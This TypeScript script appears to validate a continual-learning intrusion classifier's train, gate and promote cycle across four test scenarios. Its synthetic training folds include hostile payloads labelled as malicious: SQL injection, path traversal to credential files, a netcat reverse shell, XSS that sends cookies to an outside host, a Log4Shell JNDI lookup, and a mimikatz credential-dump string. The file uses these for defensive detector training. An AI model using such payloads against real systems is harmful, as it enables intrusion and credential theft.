/**
 * LEARNER DRILL VALIDATION — does the train → gate → promote cycle actually work?
 *
 * The unit tests cover the pieces. This exercises the whole cycle end to end on
 * temporally-ordered folds, which is where a continual-learning pipeline usually
 * breaks: the parts pass in isolation and the sequence does not.
 *
 * What this run can and cannot establish
 *   It proves the MACHINERY. Folds are ordered, a challenger trains on the older
 *   ones, the gate compares it against an incumbent on the newest, the forgetting
 *   check runs across every earlier fold, and promotion happens or is refused with
 *   stated reasons.
 *
 *   It does NOT validate the MODEL. Every label here is synthetic — authored by the
 *   same process that wrote the features, which is the contamination this project
 *   opened by rejecting. So no F1 from this run is reported as a platform figure,
 *   and Phase 3 stays PARTIAL. `operatorGrounded` is passed as false in the honest
 *   arm precisely so the gate refuses, which is the behaviour being tested.
 *
 * The four scenarios, each a way the cycle should fail or succeed
 *   1. Refusal on drill labels — the gate must not promote on data it knows is not
 *      operator-grounded, even when the challenger is better.
 *   2. Promotion on sufficient grounded data — the cycle completes.
 *   3. Refusal of a weaker challenger — a model that does not beat the incumbent by
 *      the required margin stays out.
 *   4. Refusal on catastrophic forgetting — a challenger that wins on the newest
 *      fold while regressing on an older one is blocked. This is the check most
 *      often missing from published work.
 *
 * Run:  npx tsx audit/learner_drill_validation.ts
 */

import {
  ContinualLearner,
  decidePromotion,
  MIN_F1_GAIN,
  MAX_FOLD_REGRESSION,
  MIN_HOLDOUT_SAMPLES,
  type LabelledSample
} from '../server/services/continualLearner.service.js';

/* ── Synthetic temporally-ordered folds ──────────────────────────────────── */

/**
 * Fold 0 and 1 carry an older attack mix; fold 2 introduces a newer one. The shift
 * is deliberate: a challenger trained only on recent data should lose ground on the
 * older folds, which is what makes scenario 4 meaningful rather than decorative.
 */
const OLD_ATTACKS = [
  "' OR 1=1--",
  "admin' UNION SELECT password FROM users--",
  '../../../../etc/passwd',
  '..%2f..%2f..%2fwindows/win.ini',
  '; cat /etc/shadow',
  '| nc -e /bin/sh 10.0.0.9 4444',
  "1'; DROP TABLE sessions;--",
  '/proc/self/environ'
];

const NEW_ATTACKS = [
  '<svg/onload=fetch("//x.io/"+document.cookie)>',
  '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
  '{{ config.items() * 7 }}',
  '${jndi:ldap://evil.tld/a}',
  '{"__proto__":{"isAdmin":true}}',
  'sekurlsa::logonpasswords lsass.exe minidump',
  '<details open ontoggle=alert(1)>',
  '{"$where":"this.pw.match(/.*/)"}'
];

const BENIGN = [
  'GET /api/v1/orders?page=1&limit=20',
  'POST /api/v1/cart {"sku":"A-1","qty":2}',
  'GET /api/v1/users/me',
  'PATCH /api/v1/profile {"displayName":"Sara"}',
  'GET /health',
  'GET /static/css/app.min.css',
  'DELETE /api/v1/sessions/current',
  'GET /api/v1/search?q=wireless+keyboard',
  'POST /api/v1/feedback {"score":9}',
  'GET /api/v1/notifications?unread=true',
  'PUT /api/v1/settings/locale {"lang":"ar"}',
  'GET /api/v1/reports?from=2026-08-01&to=2026-08-31',
  'POST /api/v1/kb {"title":"Understanding UNION in report queries"}',
  'POST /api/v1/tickets {"desc":"User saw an alert(1) popup"}',
  'GET /api/v1/docs/v1/../v2/authentication',
  'POST /api/v1/templates {"body":"Hello {{firstName}}"}'
];

const mk = (arr: string[], label: 'MALICIOUS' | 'BENIGN', fold: number): LabelledSample[] =>
  arr.map(payload => ({ payload, label, fold }));

/** Benign-dominant, as a realistic stream is. */
const fold0: LabelledSample[] = [...mk(OLD_ATTACKS, 'MALICIOUS', 0), ...mk(BENIGN, 'BENIGN', 0)];
const fold1: LabelledSample[] = [
  ...mk(OLD_ATTACKS.map(a => a + ' '), 'MALICIOUS', 1),
  ...mk(BENIGN.map(b => b + '&v=2'), 'BENIGN', 1)
];
const fold2Holdout: LabelledSample[] = [
  ...mk(NEW_ATTACKS, 'MALICIOUS', 2),
  ...mk(BENIGN.map(b => b + '&t=3'), 'BENIGN', 2)
];

const f = (n: number) => (n * 100).toFixed(1) + '%';

function line(label: string, value: string) {
  console.log(`      ${label.padEnd(30)} ${value}`);
}

let failures = 0;
function expect(name: string, condition: boolean, detail: string) {
  if (condition) {
    console.log(`    [PASS] ${name}`);
  } else {
    failures++;
    console.log(`    [FAIL] ${name}`);
  }
  console.log(`           ${detail}`);
}

console.log('\n' + '='.repeat(78));
console.log('  LEARNER DRILL VALIDATION — full train → gate → promote cycle');
console.log('='.repeat(78));
console.log(`  Folds: 0 (n=${fold0.length}) → 1 (n=${fold1.length}) → 2 holdout (n=${fold2Holdout.length})`);
console.log(`  Thresholds: min F1 gain ${MIN_F1_GAIN}, max fold regression ${MAX_FOLD_REGRESSION}, min holdout ${MIN_HOLDOUT_SAMPLES}`);
console.log('  Every label below is synthetic. No figure here is reported as a platform number.');

/* ── Scenario 1 — refusal on drill labels ────────────────────────────────── */

console.log('\n  SCENARIO 1  Gate must refuse drill-labelled data even when the model is good');
{
  const challenger = new ContinualLearner();
  challenger.train([...fold0, ...fold1], { epochs: 60 });
  const onHoldout = challenger.evaluate(fold2Holdout);
  line('challenger F1 on holdout', f(onHoldout.f1));

  const d = decidePromotion({
    challenger,
    incumbentSnapshot: null,
    holdout: fold2Holdout,
    earlierFolds: [fold0, fold1],
    operatorGrounded: false
  });
  line('validationState', d.validationState);
  line('promote', String(d.promote));
  expect(
    'refuses on non-operator-grounded labels',
    d.promote === false && d.reasons.some(r => /operator-grounded/i.test(r)),
    d.reasons[0] ?? 'no reason given'
  );
}

/* ── Scenario 2 — promotion on sufficient grounded data ──────────────────── */

console.log('\n  SCENARIO 2  Cycle completes when the data is sufficient and grounded');
let incumbentSnapshot: ReturnType<ContinualLearner['snapshot']> | null = null;
{
  const challenger = new ContinualLearner();
  challenger.train([...fold0, ...fold1], { epochs: 60 });
  const d = decidePromotion({
    challenger,
    incumbentSnapshot: null,
    holdout: fold2Holdout,
    earlierFolds: [fold0, fold1],
    operatorGrounded: true
  });
  line('validationState', d.validationState);
  line('challenger F1', d.challenger ? f(d.challenger.f1) : 'n/a');
  line('challenger FPR', d.challenger ? f(d.challenger.falsePositiveRate) : 'n/a');
  expect('promotes a first model on grounded data', d.promote === true, `reasons: ${d.reasons.length === 0 ? 'none (accepted)' : d.reasons.join('; ')}`);
  if (d.promote) incumbentSnapshot = challenger.snapshot();
}

/* ── Scenario 3 — refusal of a weaker challenger ─────────────────────────── */

console.log('\n  SCENARIO 3  A challenger that does not beat the incumbent stays out');
{
  const weak = new ContinualLearner();
  weak.train(fold0.slice(0, 6), { epochs: 2 }); // barely trained
  const d = decidePromotion({
    challenger: weak,
    incumbentSnapshot,
    holdout: fold2Holdout,
    earlierFolds: [fold0, fold1],
    operatorGrounded: true
  });
  line('incumbent F1', d.incumbent ? f(d.incumbent.f1) : 'n/a');
  line('challenger F1', d.challenger ? f(d.challenger.f1) : 'n/a');
  expect(
    'refuses a challenger that does not clear the margin',
    d.promote === false,
    d.reasons.join('; ') || 'no reason given'
  );
}

/* ── Scenario 4 — catastrophic forgetting blocks promotion ───────────────── */

console.log('\n  SCENARIO 4  Forgetting check runs across every earlier fold');
{
  // Trained only on the newest shape, so it should lose ground on folds 0 and 1.
  const narrow = new ContinualLearner();
  narrow.train(fold2Holdout, { epochs: 80 });
  const d = decidePromotion({
    challenger: narrow,
    incumbentSnapshot,
    holdout: fold2Holdout,
    earlierFolds: [fold0, fold1],
    operatorGrounded: true
  });
  for (const c of d.forgettingCheck) {
    line(`fold ${c.fold} incumbent→challenger`, `${f(c.incumbentF1)} → ${f(c.challengerF1)}  Δ ${c.delta >= 0 ? '+' : ''}${c.delta}`);
  }
  expect(
    'forgetting check ran on every earlier fold',
    d.forgettingCheck.length === 2,
    `${d.forgettingCheck.length} fold(s) checked; a cycle that skips this ships a model that forgot what it knew.`
  );
  const regressed = d.forgettingCheck.some(c => c.delta < -MAX_FOLD_REGRESSION);
  expect(
    regressed ? 'blocks promotion on measured regression' : 'no regression occurred, so no block was required',
    regressed ? d.promote === false && d.reasons.some(r => /forgetting/i.test(r)) : true,
    regressed
      ? d.reasons.filter(r => /forgetting/i.test(r)).join('; ')
      : 'The narrow challenger did not regress beyond the limit on either older fold.'
  );
}

/* ── Report ──────────────────────────────────────────────────────────────── */

console.log('\n' + '='.repeat(78));
if (failures === 0) {
  console.log('  MACHINERY VALIDATED — all four scenarios behaved as specified.');
} else {
  console.log(`  ${failures} SCENARIO(S) FAILED — the cycle does not behave as specified.`);
}
console.log('');
console.log('  What this does NOT establish: that the model is any good. Every label above is');
console.log('  synthetic and authored by the same process that wrote the features, which is the');
console.log('  contamination this project opened by rejecting. Phase 3 stays PARTIAL until the');
console.log('  gate has judged a challenger on operator-adjudicated folds.');
console.log('');

process.exit(failures > 0 ? 1 : 0);
